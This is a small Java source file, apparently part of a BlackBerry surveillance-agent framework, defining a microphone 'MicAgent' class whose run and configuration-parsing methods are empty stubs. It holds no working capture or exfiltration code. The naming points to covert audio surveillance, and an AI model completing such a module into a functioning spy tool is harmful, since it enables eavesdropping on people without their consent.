package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class MicAgent extends Agent {
    static Debug debug = new Debug("MicAgent", DebugLevel.VERBOSE);

    public MicAgent(boolean agentStatus) {
        super(Agent.AGENT_MIC, agentStatus, true);

    }

    protected MicAgent(boolean agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualRun() {
        debug.trace("run");
        this.sleepUntilStopped();

    }

    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
